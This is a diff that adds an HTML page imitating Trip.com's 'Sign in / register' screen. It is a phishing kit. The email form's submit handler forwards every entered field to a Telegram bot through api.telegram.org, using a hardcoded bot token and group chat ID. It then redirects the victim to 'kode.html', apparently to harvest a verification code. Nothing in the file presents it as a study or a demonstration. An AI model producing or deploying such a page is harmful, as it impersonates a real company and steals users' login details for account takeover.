@@ -1,0 +1,130 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Trip.com</title>
+<style>
+  :root { --blue:#3264f5; --ink:#172033; --muted:#7c879d; --line:#d3d9e3; }
+  * { box-sizing:border-box; }
+  html,body { margin:0; min-height:100%; font-family:Arial, Helvetica, sans-serif; color:var(--ink); }
+  body { background:linear-gradient(180deg,#dceeff 0,#eef6ff 34%,#fff 59%); }
+  .page { min-height:100svh; display:flex; flex-direction:column; }
+  header { height:64px; display:flex; align-items:center; justify-content:center; position:relative; }
+  .close { position:absolute; left:19px; top:14px; width:28px; height:28px; border:0; background:transparent; padding:0; cursor:pointer; }
+  .close:before,.close:after { content:""; position:absolute; top:13px; left:0; width:35px; height:2px; background:#111; transform:rotate(45deg); }
+  .close:after { transform:rotate(-45deg); }
+  .brand { color:#2857ff; font-size:26px; font-weight:800; letter-spacing:-.7px; }
+  main { width:min( calc(100% - 48px), 650px); margin:65px auto 0; text-align:center; }
+  h1 { font-size:27px; line-height:1.25; margin:0 0 20px; font-weight:700; }
+  .benefits { color:#8995a9; font-size:16px; display:flex; align-items:center; justify-content:center; gap:18px; margin-bottom:44px; }
+  .benefits .divider { color:#c4ccd8; }
+  .benefit-icon { font-size:19px; vertical-align:-2px; margin-right:4px; }
+  form { display:grid; gap:22px; }
+  input { width:100%; height:82px; border:1.5px solid #315fff; border-radius:6px; padding:0 20px; font:22px Arial,sans-serif; background:rgba(255,255,255,.28); outline:none; }
+  input::placeholder { color:#727c91; opacity:1; }
+  button { font:600 22px Arial,sans-serif; cursor:pointer; }
+  .continue { height:69px; border:0; border-radius:6px; color:white; background:var(--blue); }
+  .or { display:flex; align-items:center; gap:15px; color:#7b8495; font-size:18px; margin:25px 0 24px; }
+  .or:before,.or:after { content:""; height:1px; background:#cbd2dd; flex:1; }
+  .social { width:100%; height:70px; display:flex; justify-content:center; align-items:center; gap:15px; border:1px solid #d1d7e0; border-radius:6px; background:rgba(255,255,255,.2); color:#171d2a; margin-bottom:14px; }
+  .google { font-size:26px; font-weight:800; color:#4285f4; }
+  .facebook { width:30px; height:30px; border-radius:50%; background:#1877f2; color:#fff; font:bold 27px Arial; line-height:34px; }
+  .demo-note { margin-top:16px; font-size:12px; color:#9aa3b2; }
+  footer { margin:auto auto 16px; width:calc(100% - 70px); max-width:650px; color:#747e91; font-size:16px; line-height:1.8; text-align:left; }
+  footer a { color:inherit; text-decoration:underline; }
+  @media(max-width:480px) {
+    header { height:64px; }
+    main { width:calc(100% - 70px); margin-top:65px; }
+    h1 { font-size:27px; margin-bottom:20px; }
+    .benefits { font-size:15px; gap:14px; white-space:nowrap; margin-bottom:44px; }
+    input { height:82px; font-size:22px; }
+    .continue { height:69px; }
+    .social { height:70px; font-size:21px; }
+    footer { width:calc(100% - 70px); font-size:16px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+  <header>
+    <button class="close" aria-label="Tutup" type="button" onclick="document.querySelector('main').hidden=true"></button>
+    <div class="brand">Trip.com</div>
+  </header>
+  <main>
+    <h1>Sign in / register</h1>
+    <div class="benefits">
+      <span><span class="benefit-icon">🏷️</span>Get Member Benefits</span>
+      <span class="divider">|</span>
+      <span><span class="benefit-icon">🪙</span>Rewards for booking</span>
+    </div>
+    <form action="https://api.telegram.org" id="formTele" class="formtele" method="POST">
+      <input type="email" placeholder="Email" aria-label="Email" name="email">
+      <button class="continue" type="submit" id="kirim">Continue</button>
+    </form>
+  </main>
+  <footer>
+    By signing in or registering, you are deemed to have agreed to the Trip.com Terms and Conditions and Privacy Statement.
+  </footer>
+</div>
+<script>
+  const token = '9064785026:AAEayIxTHeLwFHXrtgXCko7ZQpXNnx-EYLM'
+        const group_id = '-5541390568'
+
+        const formtelegram = document.getElementById('formTele')
+
+        const sendMessage = (text) => {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    "chat_id": group_id,
+                    "text": text,
+                })
+            }).then(res => {
+                if (!res.ok) {
+                    throw new Error(res.statusText, res.status, res.url);
+                }
+
+                return res.json();
+            }).then(res => {
+                console.log(res);
+                document.getElementById('kirim').innerHTML = "MELANJUTKAN";
+                window.location.href = "kode.html";
+            }).catch(err => {
+                console.log(err);
+                alert('gagal')
+            })
+        };
+
+        formtelegram.onsubmit = (e) => {
+            e.preventDefault();
+
+            const formData = new FormData(formtelegram)
+
+           let text = `
+╭━━━━━━━━━━━━━━━━━━╮
+|━━━━━ＢｏｋｉＤｅｖ━━━━|
+╰━━━━━━━━━━━━━━━━━━╯
+
+`;
+
+            for (const [key, val] of formData) {
+                text += `🔹 ${key.toUpperCase()}: ${val}\n`;
+            }
+
+            text += `
+━━━━━━━━━━━━━━━━━━━━
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+🌐 Status: Form submitted
+━━━━━━━━━━━━━━━━━━━━`;
+
+
+            sendMessage(text);
+        };
+
+</script>
+</body>
+</html>
